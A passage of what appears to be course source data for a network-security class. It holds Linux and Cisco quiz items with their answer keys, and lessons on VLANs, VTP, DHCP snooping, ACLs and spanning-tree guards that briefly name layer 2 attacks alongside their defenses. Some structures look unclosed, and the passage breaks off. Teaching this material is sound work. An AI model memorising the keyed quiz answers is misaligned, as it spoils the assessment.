     ['Which sysctl helps against IP address spoofing?',['kernel.randomize_va_space','net.ipv4.conf.all.rp_filter','vm.swappiness','fs.file-max'],1,'rp_filter drops packets whose return route to the source uses a different interface.',{whys:['randomize_va_space sets ASLR, a defense against memory attacks.','rp_filter drops packets whose return path uses another interface, which blocks spoofing.','vm.swappiness tunes memory use rather than traffic.','fs.file-max limits open files rather than traffic.'],imp:'good',c:'host-misc-hardening'}],
     ['Best single command to see what is listening and which process owns it?',['ps aux','sudo ss -tulnp','top','df -h'],1,'ss -tulnp ties ports to processes, the question you ask on every machine.',{whys:['ps aux lists processes without their ports.','-l lists the listening ports, and with sudo -p names the process behind each one, so one command answers both halves.','top ranks processes by load, without their ports.','df -h shows free disk space, without ports or processes.'],imp:'core',c:'host-services'}],
      ['On makani-web, <code>journalctl -u ssh | grep "Failed password" | grep -oE "from [0-9.]+" | sort | uniq -c | sort -rn</code> starts <code>212 from 203.0.113.50</code>, then <code>9 from 198.51.100.7</code>. Later: <code>Accepted password for kai from 203.0.113.50</code>. What follows?',['Nothing: every server sees failures','198.51.100.7 is the bigger threat','kai’s password was guessed: reset it, review the session, and require keys','fail2ban stopped 203.0.113.50'],2,'On Debian, fail2ban reads the journal only with backend = systemd. <a href="#sophomore/s10">Review: Read the logs: Windows, Linux, and network devices</a>',{whys:['Failures followed by a success from the same address mean a guessed password.','198.51.100.7 failed 9 times and stayed out; 203.0.113.50 got in.','Guessing, then a success from that address, means kai’s password fell: reset it and require keys.','The later success shows 203.0.113.50 got in, so nothing stopped it.'],imp:'core',c:'det-unix-logs'}],
      ['makani-web’s brief keeps MySQL for the shop’s web app on the same server. <code>sudo ss -tlnp</code> shows <code>0.0.0.0:3306</code>, and mysql.user holds an account with an empty name. Best next step?',['Purge mysql-server','Run sudo mysql_secure_installation, set bind-address = 127.0.0.1, restart mysql, and check ss again','Block 3306 in ufw and leave the accounts as they are','Stop mysql and leave it off'],1,'Harden what the brief keeps instead of removing it. <a href="#junior/j3">Review: Debian and deeper Linux</a>',{whys:['The brief keeps MySQL, so purging it breaks the shop’s web app.','The wizard removes the anonymous account, the bind address keeps port 3306 to this machine, and ss proves it.','ufw makes a good second layer, and the anonymous account still lets any program on the server in.','A stopped database takes the web app down, which the brief rules out.'],imp:'core',c:'host-services'}]
   ]),
   REFLECT('j3r','Persistence you would check first','You have fifteen minutes on a Debian server that may hold an intruder\u2019s foothold. Write the five places you check for persistence, in order, with the command for each, and say why the first one comes first.'),
   LINKS('Go further',['debian-handbook','debian-security','debian-wiki','gtfobins','nftables-wiki','cis','stig','explainshell','t4t-lr-linux'])
  ]},
 {id:'j4',title:'Cisco: VLANs, routing, and ACLs',bloom:'Apply',sum:'Segment a network with VLANs, route between them, and filter traffic with access lists.',
  can:'segment a network with VLANs, route between them, filter with an access list, and verify each from show output',
  blocks:[
   C('VLANs and trunks','Apply',
     CMDS('Segment SwA and SwB',[
       ['vlan 10','Create the VLAN. Then: name STUDENTS. Repeat with vlan 20 (name TEACHERS), vlan 30 (name PRINCIPALS), vlan 99 (name NATIVE), and vlan 999 (name PARKING) on both SwA and SwB.'],
       ['interface range f0/1 - 8','Several ports at once.'],
       ['switchport mode access','Host ports; the trunk is set separately.'],
       ['switchport access vlan 10','Put the ports in VLAN 10, Students. Ports f0/9 - 16 go in VLAN 20 and f0/17 - 20 in VLAN 30.'],
       ['spanning-tree portfast','Then: spanning-tree bpduguard enable. Both belong on edge ports, as in Sophomore.'],
       ['interface g0/1','The uplink: SwA G0/1 to RtrA G0/0 (SwB G0/1 to RtrB G0/0).'],
       ['switchport mode trunk','Carry multiple VLANs over one link.'],
       ['switchport trunk native vlan 99','The one untagged VLAN on this trunk, matched by the router’s g0/0.99.'],
       ['switchport trunk allowed vlan 10,20,30,99','Only the VLANs you intend, the native VLAN included. Fewer VLANs on a trunk means less exposure. This form replaces the whole list; switchport trunk allowed vlan add 30 appends one VLAN.'],
       ['switchport nonegotiate','Stops the port sending DTP (Dynamic Trunking Protocol) frames. The port is already a trunk by configuration, and the router at the far end never speaks DTP.'],
       ['show vlan brief','Verify port-to-VLAN assignments.'],
       ['show interfaces trunk','Verify the trunk, its native VLAN (99), and the allowed VLANs.']
     ]),
     DETAIL('Voice VLAN for IP phones',
     CMDS('If the school adds IP phones',[
       ['vlan 40','Then: name VOICE. Phones get a VLAN of their own, added to the plan and to each trunk with switchport trunk allowed vlan add 40.'],
       ['switchport voice vlan 40','On an access port that feeds a phone with a PC plugged into the phone: the phone’s traffic crosses tagged in VLAN 40, and the PC’s stays untagged in the access VLAN. The access VLAN stays as it was, so <code>switchport access vlan</code> still decides where the PC lands. The phone learns the number 40 from CDP or LLDP-MED. Port security on that port needs a maximum of at least 2, one for the phone and one for the PC.']
     ])),
     DETAIL('Trunk encapsulation, DTP modes, and VTP',
     NOTE('A 2960 speaks only 802.1Q. Multilayer switches that also support ISL, such as the 3560 and 3750, take <code>switchport trunk encapsulation dot1q</code> before <code>switchport mode trunk</code> (the Packet Tracer 3650 accepts it too).'),
       TIPS('<b>DTP modes:</b> access, trunk, dynamic auto (the 2960 default), and dynamic desirable. Two dynamic auto ports stay access; desirable with auto, desirable, or trunk forms a trunk. <code>switchport nonegotiate</code> stops DTP frames on a configured trunk.',
            '<b>VTP</b> (VLAN Trunking Protocol) copies VLAN lists between switches. Server mode (the default) and client mode accept updates that can overwrite local VLANs; transparent mode ignores them. show running-config lists the VTP mode only in transparent mode, and the VLAN list lives in vlan.dat in flash.'))),
    C('Keep each switch’s VLANs its own: VTP','Apply',
     P('<b>VTP</b> (VLAN Trunking Protocol) sends a switch’s VLAN list to every switch in the same VTP domain over trunks. A switch in <b>server</b> mode (the default) or <b>client</b> mode adopts any advertisement with a higher configuration revision number. A spare switch from storage, with the same domain name and a higher revision, can therefore replace every VLAN list in the domain: VLANs it lacks disappear, and their ports go inactive. A host that forms a trunk can send the same advertisements.'),
     CMDS('Set and check the VTP mode',[
       ['vtp mode transparent','Global configuration: this switch keeps its own VLAN list, ignores the VLAN changes in advertisements, and passes them along its trunks. Its VLANs then appear in show running-config as well as in vlan.dat.'],
       ['vtp mode off','Like transparent, and it stops passing advertisements too. Images with VTP version 3 accept it; Packet Tracer and some older images offer transparent only.'],
       ['vtp domain school.lan','Names the VTP domain. In transparent or off mode the name changes nothing on this switch’s VLANs.'],
       ['show vtp status','Shows the VTP Operating Mode, domain name, and Configuration Revision, which stays 0 in transparent mode.']
     ]),
     DETAIL('Sample show vtp status output',
     TERM('SwA# show vtp status\nVTP Version capable             : 1 to 3\nVTP version running             : 1\nVTP Domain Name                 : \n...\nFeature VLAN:\n--------------\nVTP Operating Mode                : Transparent\nMaximum VLANs supported locally   : 255\nNumber of existing VLANs          : 10\nConfiguration Revision            : 0')),
     NOTE('SwA and SwB get VLANs by hand, so both run <code>vtp mode transparent</code>. Before a used switch joins any network, check show vtp status: a server-mode switch with a high revision is the risk.')),
   ANATOMY('One switch, two networks: each VLAN is its own broadcast domain',[
     {name:'Switch SwA',tag:'one physical box · layer 2',tone:'muted',grid:true,
      panel:['Between the VLANs','Only a layer 3 hop: a router or a layer 3 switch'],
      children:[
        {name:'VLAN 10 · STUDENTS',tag:'10.1.10.0/24',tone:'l1',text:'Ports Fa0/1–8<br>Students PC 10.1.10.20<br>Gateway 10.1.10.1'},
        {name:'VLAN 20 · TEACHERS',tag:'10.1.20.0/24',tone:'l3',text:'Ports Fa0/9–16<br>Teachers PC 10.1.20.30<br>Gateway 10.1.20.1'}]}
   ],{label:'SwA holds two of its VLANs here. VLAN 10, Students, uses 10.1.10.0/24 and VLAN 20, Teachers, uses 10.1.20.0/24. Traffic between them needs a router or a layer 3 switch.',
     facts:{head:['','Inside one VLAN','Between two VLANs'],rows:[
       ['Forwarded by','The switch, by destination MAC','A router or layer 3 switch, by destination IP'],
       ['Broadcasts (ARP, DHCP)','Reach every port in the VLAN','Stop at the VLAN’s edge'],
       ['Addressing','One subnet','Two subnets'],
       ['A host sends to','The other host’s MAC','Its default gateway']]},
     note:'<b>A trunk joins switches, and each VLAN keeps its identity across it.</b> VLAN 10 on one switch and VLAN 10 on the next form one VLAN.',
     key:[['l1','VLAN 10 · STUDENTS'],['l3','VLAN 20 · TEACHERS'],['muted','The physical switch']]}),
   COMPARE('Access port and trunk port: untagged and tagged frames',[
     {name:'Access port',tag:'switchport mode access',tone:'l1',
      svg:{label:'An Ethernet frame on an access port: destination MAC, source MAC, type, data, and FCS, untagged.',
       body:'<g font-size="9" text-anchor="middle" fill="var(--ink)"><rect x="4" y="20" width="46" height="28" fill="var(--paper)" stroke="var(--l1)" stroke-width="1.5"/><text x="27" y="38">Dst MAC</text><rect x="50" y="20" width="46" height="28" fill="var(--paper)" stroke="var(--l1)" stroke-width="1.5"/><text x="73" y="38">Src MAC</text><rect x="96" y="20" width="30" height="28" fill="var(--paper)" stroke="var(--l1)" stroke-width="1.5"/><text x="111" y="38">Type</text><rect x="126" y="20" width="42" height="28" fill="var(--paper)" stroke="var(--l1)" stroke-width="1.5"/><text x="147" y="38">Data</text><rect x="168" y="20" width="28" height="28" fill="var(--paper)" stroke="var(--l1)" stroke-width="1.5"/><text x="182" y="38">FCS</text></g><text x="100" y="66" text-anchor="middle" font-size="10" fill="var(--ink-2)">untagged: a plain Ethernet frame</text>'},
      rows:[['Carries','One VLAN: <code>switchport access vlan 10</code>'],
            ['Frames','Untagged; the host sees a plain Ethernet frame'],
            ['Connects','An end device, such as a PC, a printer, or a server'],
            ['Verify','<code>show vlan brief</code>']],
      hook:'a door into one room.'},
     {name:'Trunk port',tag:'switchport mode trunk',tone:'l3',
      svg:{label:'An Ethernet frame on a trunk: a 4-byte 802.1Q tag holding the VLAN ID sits between the source MAC and the type field.',
       body:'<g font-size="9" text-anchor="middle" fill="var(--ink)"><rect x="4" y="20" width="30" height="28" fill="var(--paper)" stroke="var(--l3)" stroke-width="1.5"/><text x="19" y="38">Dst</text><rect x="34" y="20" width="30" height="28" fill="var(--paper)" stroke="var(--l3)" stroke-width="1.5"/><text x="49" y="38">Src</text><rect x="64" y="16" width="46" height="36" fill="var(--amber-bg)" stroke="var(--amber)" stroke-width="2.5"/><text x="87" y="32" font-weight="700">802.1Q</text><text x="87" y="44">VLAN 10</text><rect x="110" y="20" width="32" height="28" fill="var(--paper)" stroke="var(--l3)" stroke-width="1.5"/><text x="126" y="38">Type</text><rect x="142" y="20" width="30" height="28" fill="var(--paper)" stroke="var(--l3)" stroke-width="1.5"/><text x="157" y="38">Data</text><rect x="172" y="20" width="24" height="28" fill="var(--paper)" stroke="var(--l3)" stroke-width="1.5"/><text x="184" y="38">FCS</text></g><text x="87" y="10" text-anchor="middle" font-size="9" fill="var(--ink-2)">4-byte tag</text><text x="100" y="66" text-anchor="middle" font-size="10" fill="var(--ink-2)">tagged: the VLAN ID rides in the frame</text>'},
      rows:[['Carries','Several VLANs: <code>switchport trunk allowed</code> <code>vlan 10,20,30,99</code>'],
            ['Frames','Tagged with a 4-byte 802.1Q tag, inserted after the source MAC'],
            ['Inside the tag','TPID 0x8100, a 3-bit priority, a 1-bit DEI, and a 12-bit VLAN ID (1–4094)'],
            ['Connects','Another switch, or a router doing router-on-a-stick'],
            ['Verify','<code>show interfaces trunk</code>']],
      hook:'a hallway where every frame wears its room number.'}
   ],{note:'<b>Native VLAN:</b> one VLAN per trunk crosses untagged, VLAN 1 unless you change it. The next card moves it to VLAN 99 on both ends.',
     caption:'The switch adds the tag as a frame leaves on a trunk and removes it before the frame leaves an access port.',
     bloom:'Apply'}),
   C('Native VLAN 99 on both ends','Analyze',
     TIPS('<b>Set it on both ends.</b> On SwA G0/1: <code>switchport trunk native vlan 99</code>. On RtrA: <code>interface g0/0.99</code>, then <code>encapsulation dot1Q 99 native</code>.',
          '<b>Use a host-free VLAN.</b> VLAN 99 stays free of access ports, an SVI, and an IP address, and it stays separate from VLAN 999, where unused ports park.',
          '<b>Add 99 to the allowed list:</b> <code>switchport trunk allowed vlan 10,20,30,99</code>.',
          '<b>A mismatch shows up in the log.</b> Between Cisco devices running CDP, two ends that disagree log <code>%CDP-4-NATIVE_VLAN_MISMATCH</code>, and on a switch-to-switch trunk untagged frames from one VLAN land in the other.',
          '<b>Why:</b> double tagging works when an attacker’s access VLAN equals the trunk’s native VLAN. The first switch strips the outer tag and the next one obeys the inner tag. A host-free native VLAN leaves nothing to hop from.')),
   QUIZ('j4ck1','Check yourself',[
     ['From Freshman: which SwA ports get PortFast?',['G0/1, the trunk, so the router link comes up sooner','Every port, G0/1 and the parked ports included','The access ports Fa0/1 to Fa0/20','The parked ports, so they come up sooner when enabled'],2,'PortFast belongs on edge ports; the trunk keeps full spanning tree to catch loops.',{whys:['The trunk keeps full spanning tree so it can catch a loop.','Every port includes the trunk, which needs the loop check.','Fa0/1 to Fa0/20 are access ports with one end device each, which is where PortFast belongs.','Parked ports sit shut down, so a faster start gives them nothing.'],imp:'good',c:'cisco-vlans-trunks'}],
     ['How does RtrA match SwA’s native VLAN 99?',['<code>interface g0/0.99</code>, then <code>encapsulation dot1Q 99 native</code>','<code>switchport trunk native vlan 99</code> on g0/0','An IP address on g0/0.99','<code>vlan 99</code> on the router'],0,'The native keyword makes the subinterface send and receive VLAN 99 untagged. It carries no hosts, so it takes no IP address.',{whys:['Routers lack switchport commands, so the native VLAN goes on a subinterface, where the native keyword handles VLAN 99 untagged.','switchport trunk native vlan is a switch command; a router sets it on a subinterface.','VLAN 99 carries no hosts, so its subinterface takes no IP address.','vlan 99 builds a VLAN on a switch; the router uses subinterfaces instead.'],imp:'good',c:'cisco-inter-vlan-routing'}]
   ]),
   C('Layer 2 attacks and the switch defense for each','Understand',
     TIPS('<b>Switch spoofing</b> (a host negotiates a trunk with DTP): set every port to access or trunk by hand, with <code>switchport nonegotiate</code> on trunks.',
          '<b>Double tagging</b> (a second tag hops through the native VLAN): a host-free native VLAN.',
          '<b>Rogue DHCP server</b> (a fake gateway and DNS server for every client): DHCP snooping, with only the uplinks trusted.',
          '<b>ARP poisoning</b> (a host answers ARP for the gateway’s IP address with its own MAC, so traffic for the gateway goes to it): dynamic ARP inspection, checked against the DHCP snooping table.',
          '<b>MAC flooding</b> (thousands of fake source MACs fill the switch’s MAC table, so it floods frames out every port): port security with a maximum MAC count.',
          '<b>Rogue IPv6 router advertisement</b> (a host announces itself as the gateway): RA guard on access ports.',
          '<b>Root bridge takeover</b> (a rogue switch with a lower bridge priority claims root): BPDU guard on edge ports.',
          '<b>Unknown device on a wall jack:</b> port security, which limits the MAC addresses a port accepts.',
          '<b>Broadcast storm:</b> storm control, a per-port broadcast limit.')),
   C('Turn on three switch defenses','Apply',
     P('Three of the defenses above, configured on SwA (SwB takes the same lines). Each one sets which ports may send one kind of message.'),
     CMDS('DHCP snooping: only the uplink may answer',[
       ['ip dhcp snooping','Global configuration: turns snooping on, acting only on the VLANs named next.'],
       ['ip dhcp snooping vlan 10,20,30','The user VLANs to watch. Every port in them starts untrusted: client messages pass, and server messages (offers and acknowledgments) arriving there are dropped and logged.'],
       ['interface g0/1','The trunk toward RtrA, where the real DHCP answers arrive.'],
       ['ip dhcp snooping trust','Under that uplink only: server messages may arrive here. Every access port stays untrusted, so a rogue server on a wall jack answers no one.'],
       ['show ip dhcp snooping','Confirms “Switch DHCP snooping is enabled”, the VLANs it covers, and which interfaces are trusted.'],
       ['show ip dhcp snooping binding','The binding table: each client’s MAC, IP address, lease, VLAN, and port, the list dynamic ARP inspection checks.']
     ]),
     NOTE('When RtrA serves the pool itself, the switch’s option 82 field (added by default once snooping is on) can make the IOS DHCP server ignore the requests, and clients fall back to 169.254.x.x. <code>no ip dhcp snooping information option</code> on the switch is the usual fix. After turning snooping on, check that leases still appear in show ip dhcp binding on RtrA.',true),
     CMDS('Spanning tree: a faster mode, and a guard for each kind of port',[
       ['spanning-tree mode rapid-pvst','Global configuration: Rapid PVST+ (rapid spanning tree, one instance per VLAN) instead of PVST+, the 2960 default that show running-config lists as spanning-tree mode pvst. Both are normal settings; rapid recovers from a failed link in a few seconds instead of 30 to 50. Use one mode across the network, since a rapid port falls back to the slower rules toward a PVST+ neighbor.'],
       ['spanning-tree bpduguard enable','On edge ports (Sophomore): any BPDU at all err-disables the port, because nothing behind a PC port should speak spanning tree.'],
       ['spanning-tree guard root','On a port toward a switch you manage that must never become root. BPDUs are normal there; a superior one, claiming root, blocks the port (root-inconsistent) until those BPDUs stop.'],
       ['show spanning-tree inconsistentports','Lists the ports root guard is holding blocked, by VLAN.']
     ]),
     TIPS('Root guard protects a root you chose on purpose: <code>spanning-tree vlan 10,20,30,99 root primary</code> makes the central switch the root for those VLANs.')),
   C('Inter-VLAN routing and ACLs','Apply',
     CMDS('Route, then filter (RtrA)',[
       ['interface g0/0','The physical link to SwA G0/1. Then: no shutdown. It takes no IP address; the subinterfaces do.'],
       ['interface g0/0.10','Router subinterface for VLAN 10 (router-on-a-stick).'],
       ['encapsulation dot1Q 10','Binds this subinterface to frames tagged 10.'],
       ['ip address 10.1.10.1 255.255.255.0','The gateway for Students.'],
       ['interface g0/0.20','Then: encapsulation dot1Q 20 and ip address 10.1.20.1 255.255.255.0, the gateway for Teachers.'],
       ['interface g0/0.30','Then: encapsulation dot1Q 30 and ip address 10.1.30.1 255.255.255.0, the gateway for Principals.'],
       ['interface g0/0.99','Then: encapsulation dot1Q 99 native. It matches the switch’s native VLAN; it carries no hosts, so it needs no IP.'],
       ['interface g0/2','The inter-site link to RtrB G0/2. Then: ip address 10.0.0.1 255.255.255.252 and no shutdown.'],
       ['ip route 10.2.0.0 255.255.0.0 10.0.0.2','In global configuration: a static route that sends every Site B subnet (10.2.0.0/16) to RtrB at 10.0.0.2. RtrB needs the mirror route, ip route 10.1.0.0 255.255.0.0 10.0.0.1.'],
       ['access-list 10 permit 10.1.10.0 0.0.0.255','Standard ACL: match a source network with a wildcard mask (inverse of the subnet mask).'],
       ['ip access-list extended BLOCK_TELNET','Named extended ACL for protocol and port control.'],
       ['deny tcp any any eq 23','Inside the named ACL: block Telnet from the Students VLAN, since the ACL sits inbound on g0/0.10.'],
       ['permit ip any any','End with a permit when you mean to block only some traffic.'],
       ['ip access-group BLOCK_TELNET in','Under interface g0/0.10: applies the ACL to packets arriving from Students, before routing.'],
       ['show access-lists','Verify ACLs and hit counts.'],
       ['show ip route','Verify routing. Reading the routing table, below, walks through its output.']
     ])),
   QUIZ('j4ck2','Check yourself',[
     ['Hosts in VLAN 10 and VLAN 20 need to reach each other. What provides the path?',['A second switch','Inter-VLAN routing (router subinterfaces or a layer 3 switch)','A longer cable','Disabling the firewall'],1,'VLANs are separate networks; something at layer 3 must route between them.',{whys:['A second switch adds ports, and the VLANs stay separate layer 2 networks.','VLANs are separate networks, so a router or a layer 3 switch has to route between them.','A longer cable still lands in the same VLAN, a separate network.','Disabling the firewall weakens security and still leaves the VLANs unrouted.'],imp:'core',c:'cisco-inter-vlan-routing'}]
   ]),
    PATH('Router-on-a-stick: up the trunk tagged 10, back down tagged 20',[
     {name:'Students PC',tag:'VLAN 10 · 10.1.10.20',tone:'l1',note:'Sees 10.1.20.30 on another subnet, so it sends the frame to its gateway, 10.1.10.1',via:'Untagged, on an access port'},
     {name:'SwA',tag:'layer 2',tone:'l1',note:'Knows the frame is in VLAN 10 from the access port, and sends it out the trunk, G0/1',via:'Tagged 10 on the trunk'},
     {name:'RtrA: g0/0.10 to g0/0.20',tag:'layer 3',tone:'l4',note:['Accepts the frame on the subinterface whose <code>encapsulation dot1Q 10</code> matches the tag','An inbound ACL on .10 checks the packet here, before routing','Routes it to 10.1.20.0/24 and builds a new frame for VLAN 20'],via:'Tagged 20, back down the same trunk'},
     {name:'SwA',tag:'layer 2',tone:'l3',note:'Removes the tag and sends the frame out the access port for the Teachers PC',via:'Untagged, on an access port'},
     {name:'Teachers PC',tag:'VLAN 20 · 10.1.20.30',tone:'l3',note:'Receives a frame from the router’s MAC address'}
   ],{note:'<b>The subinterface number is a label.</b> <code>encapsulation dot1Q 10</code> binds the subinterface to VLAN 10; matching .10 is a convention. A layer 3 switch does the same job with SVIs (<code>interface vlan 10</code>) and <code>ip routing</code>.',
     key:[['l1','VLAN 10 side'],['l3','VLAN 20 side'],['l4','The router: layer 3']],
     bloom:'Apply'}),
   C('Reading the routing table','Understand',
     TERM('RtrA# show ip route\nCodes: L - local, C - connected, S - static, O - OSPF ...\nGateway of last resort is not set\n\n      10.0.0.0/8 is variably subnetted, 9 subnets, 4 masks\nC        10.0.0.0/30 is directly connected, GigabitEthernet0/2\nL        10.0.0.1/32 is directly connected, GigabitEthernet0/2\nC        10.1.10.0/24 is directly connected, GigabitEthernet0/0.10\nL        10.1.10.1/32 is directly connected, GigabitEthernet0/0.10\nC        10.1.20.0/24 is directly connected, GigabitEthernet0/0.20\nL        10.1.20.1/32 is directly connected, GigabitEthernet0/0.20\nC        10.1.30.0/24 is directly connected, GigabitEthernet0/0.30\nL        10.1.30.1/32 is directly connected, GigabitEthernet0/0.30\nS        10.2.0.0/16 [1/0] via 10.0.0.2'),
     TIPS('<b>C</b> is a connected network and <b>L</b> the router’s own address on it, a /32; <b>S</b> is a static route. In <code>[1/0]</code>, the first number is the administrative distance and the second the metric.',
          '<b>The default route</b> catches every destination missing from the table. On a router with one way out, such as R1 in the IOS CLI Lab, <code>ip route 0.0.0.0 0.0.0.0 203.0.113.1</code> adds it; the table then shows <code>S* 0.0.0.0/0</code> and “Gateway of last resort is 203.0.113.1 to network 0.0.0.0”. A router without one drops traffic for unknown networks.',
          '<b>How a router picks:</b> the longest matching prefix wins first, so 10.2.20.0/24 beats 10.2.0.0/16, which beats 0.0.0.0/0. Among routes to the same prefix, the lower administrative distance wins (connected 0, static 1, and OSPF 110), then the lower metric.')),
   C('DHCP across VLANs','Understand',
     TIPS('A host finds a DHCP server by broadcast, and the router keeps broadcasts inside each VLAN.',
          'Each gateway therefore either serves the pool itself or relays the request to a central server with <code>ip helper-address</code> on the gateway subinterface.',
          'A Windows host whose DHCP request goes unanswered falls back to 169.254.x.x (APIPA), the clue from <a href="#freshman/f4">Freshman</a>.'),
     CMDS('A DHCP pool on RtrA for Students',[
       ['ip dhcp excluded-address 10.1.10.1 10.1.10.9','Global configuration: keeps the gateway and the fixed addresses (.1 to .9) out of the pool.'],
       ['ip dhcp pool STUDENTS','Creates the pool and enters its mode, RtrA(dhcp-config)#.'],
       ['network 10.1.10.0 255.255.255.0','The subnet the pool hands out, used for requests arriving on RtrA’s interface in that subnet, g0/0.10.'],
       ['default-router 10.1.10.1','The gateway each client receives; it must be RtrA’s own address in that subnet. With a wrong value, local traffic works and everything else fails.'],

     SEQ('Discover, offer, request, acknowledge',[

       {ask:'Which offer reaches the client first?',tone:'amber',branches:[['From the real server: passes','It arrives through the trusted uplink, so DHCP snooping passes it.'],['From a rogue server on an access port: dropped','It names a host as gateway and DNS server. Snooping drops server messages on untrusted ports and logs the drop, so the client sees only the real offer.']]},
       ['Request','The client broadcasts the offer it accepts, so any other server withdraws its own.'],

     ],{intro:'Four messages, often remembered as DORA. Only the offer and the acknowledgment come from a server, so those are the two a rogue forges.',

     bloom:'Apply'}),
   SEQ('How a router reads an ACL: top down, first match wins',[
     ['A packet meets the ACL','On <code>g0/0.10</code> with <code>ip access-group BLOCK_TELNET in</code>, before the routing decision.','l2'],
     {ask:'Line 10: <code>deny tcp any any eq 23</code>. A match?',tone:'l2',branches:[['Match','Deny: drop the packet and stop; later lines are skipped.'],['Otherwise','Go to the next line.']]},
     {ask:'Line 20: <code>permit ip any any</code>. A match?',tone:'l2',branches:[['Match','Permit: forward the packet and stop.'],['Otherwise','Go to the next line.']]},
     ['Implicit deny any','An unseen last line drops every packet that reaches it. It stays hidden in <code>show access-lists</code>, hit counter included.','bad']],
     {intro:'The router checks lines in order and acts on the first one that matches. Order beats specificity: a more specific line further down comes too late.',

      caption:'Put specific lines first, end with a permit for traffic that should pass, and check hit counts in show access-lists.',
      bloom:'Apply'}),
   C('Teachers-only management with access-class','Apply',
     CMDS('One standard ACL, on every VTY line of all four devices',[

       ['access-list 20 permit 10.1.20.0 0.0.0.255','Site A Teachers.'],
       ['access-list 20 permit 10.2.20.0 0.0.0.255','Site B Teachers.'],
       ['line vty 0 15','On SwA and SwB. On RtrA and RtrB, enter every VTY range that show running-config lists (line vty 0 4, and line vty 5 15 where it appears).'],
       ['access-class 20 in','Only sources that ACL 20 permits open a session to this device.'],
       ['show access-lists 20','Verify the two permits and their match counts.'],
       ['ip access-list standard 20','Edit one entry: enter the numbered list in named mode, then remove one line by its sequence number from show access-lists, as in no 30.'],
       ['no access-list 20','Careful: this form deletes the whole list and leaves access-class 20 pointing at nothing. Depending on the IOS release, that either admits every source or turns every new session away, so edit one line by its sequence number instead.']
     ]),
     NOTE('<b>access-class and ip access-group filter different things.</b> Under a line, <code>access-class</code> filters sessions to the device, such as SSH to SwA. Under an interface, <code>ip access-group</code> filters traffic through it. In both, the implicit deny drops every source the list leaves out.'),

   SEQ('Prove it layer by layer',[

     ['<code>show ip route</code> on RtrA','The C, L, and S routes shown in Reading the routing table.','l3'],
     ['Students PC: <code>ping 10.1.20.1</code>','RtrA answers for its Teachers address, so VLAN 10 crosses the trunk, g0/0.10 routes, and g0/0.20 is up. The next ping proves VLAN 20 crosses the trunk too.','l4'],

   LAB('j4lab','Build Site A end to end, then Site B','Use Packet Tracer (2960 switches and 2911 routers), starting from the Sophomore SwA build. The IOS CLI Lab in Free play has one router and one switch, so it covers the Site A steps; build Site B and run the cross-site checks in Packet Tracer. Site A steps show their commands; Site B steps give only the goal, so you write those commands yourself. Semicolons separate the lines you type.',[
     ['SwA: confirm VLANs 10 STUDENTS, 20 TEACHERS, 30 PRINCIPALS, and 99 NATIVE.','show vlan brief'],
     ['SwA: make G0/1 a trunk with native VLAN 99 and the four allowed VLANs.','interface g0/1; switchport mode trunk; switchport trunk native vlan 99; switchport trunk allowed vlan 10,20,30,99; switchport nonegotiate'],
     ['RtrA: bring up g0/0 and build the three gateways.','interface g0/0; no shutdown; interface g0/0.10; encapsulation dot1Q 10; ip address 10.1.10.1 255.255.255.0; interface g0/0.20; encapsulation dot1Q 20; ip address 10.1.20.1 255.255.255.0; interface g0/0.30; encapsulation dot1Q 30; ip address 10.1.30.1 255.255.255.0'],
     ['RtrA: match the native VLAN.','interface g0/0.99; encapsulation dot1Q 99 native'],
     ['RtrA: address the inter-site link and add a route to Site B.','interface g0/2; ip address 10.0.0.1 255.255.255.252; no shutdown; exit; ip route 10.2.0.0 255.255.0.0 10.0.0.2'],
     ['SwA and RtrA: Teachers-only management on every VTY line (on RtrA, every range that show running-config lists).','access-list 20 permit 10.1.20.0 0.0.0.255; access-list 20 permit 10.2.20.0 0.0.0.255; line vty 0 15; access-class 20 in'],
     ['Site A check: a Students PC pings a Teachers PC.','ping 10.1.20.30'],
     ['Site B: build SwB the way Sophomore built SwA (hostname SwB, the five VLANs, edge ports with PortFast and BPDU guard, parked ports, SVI 10.2.20.2 with gateway 10.2.20.1, and SSH), then the trunk.',null],
     ['Site B: give RtrB the Sophomore router baseline, then repeat the router work with 10.2.x.0 subnets, 10.0.0.2 on G0/2, and a route back to 10.1.0.0/16.',null],
     ['Site B: put the same ACL 20 on every VTY line of SwB and RtrB.',null],
     ['Cross-site check: a Site A Teachers PC pings a Site B Teachers PC.','ping 10.2.20.30'],
     ['ACL check: SSH to SwA from a Teachers PC (a login prompt), then from a Students PC (connection refused).','ssh -l netadmin 10.1.20.2'],
     ['Optional: serve DHCP for VLAN 10 from RtrA, then run ipconfig /renew on a Students PC set to get its address automatically.','ip dhcp excluded-address 10.1.10.1 10.1.10.9; ip dhcp pool STUDENTS; network 10.1.10.0 255.255.255.0; default-router 10.1.10.1']
   ]),
   SPOT('j4sp','Read these outputs and flag each fault','Excerpts from SwA and RtrA at Site A. Tap every line that shows a fault, then Check. The prompt lines and the correct settings are safe.',[
     ['SwA# show interfaces f0/1 switchport',null],
     ['Name: Fa0/1',null],
     ['Administrative Mode: static access',null],
     ['Access Mode VLAN: 10 (STUDENTS)',null,'Fa0/1 sits in the Students range (f0/1 - 8), so VLAN 10 is its right home.'],
     ['SwA# show interfaces f0/5 switchport',null],
     ['Name: Fa0/5',null],
     ['Administrative Mode: static access',null],
     ['Access Mode VLAN: 1 (default)','Fa0/5 sits in the Students range (f0/1 - 8) yet lands in VLAN 1, the default. The PC there misses the Students gateway, and VLAN 1 carries user traffic. Fix: switchport access vlan 10.'],
     ['SwA# show interfaces g0/1 switchport',null],
     ['Name: Gi0/1',null],
     ['Administrative Mode: trunk',null],
     ['Operational Mode: trunk',null],
     ['Trunking Native Mode VLAN: 99 (NATIVE)',null,'Native VLAN 99 is the design: a VLAN with no hosts, crossing untagged. The mismatch sits on RtrA’s side, which expects VLAN 1.'],
     ['SwA# show interfaces trunk',null],
     ['Port        Mode    Encapsulation  Status     Native vlan',null],
     ['Gi0/1       on      802.1q         trunking   99',null],
     ['Port        Vlans allowed on trunk',null],
     ['Gi0/1       10,20,99','VLAN 30 is missing from the allowed list, so Principals frames stop at SwA and Principals lose their gateway. Fix: switchport trunk allowed vlan add 30.'],
     ['SwA# show running-config interface g0/1 | include native|mode|portfast',null],
     [' switchport trunk native vlan 99',null],
     [' switchport mode trunk',null],
     [' spanning-tree portfast trunk','PortFast belongs on the Fa edge ports. G0/1 is the uplink trunk; if a switch ever sits at the far end, PortFast lets a loop forward before spanning tree can block it. Fix: no spanning-tree portfast trunk.'],
     ['RtrA# show running-config | section interface GigabitEthernet0/0',null],
     ['interface GigabitEthernet0/0.1',null],
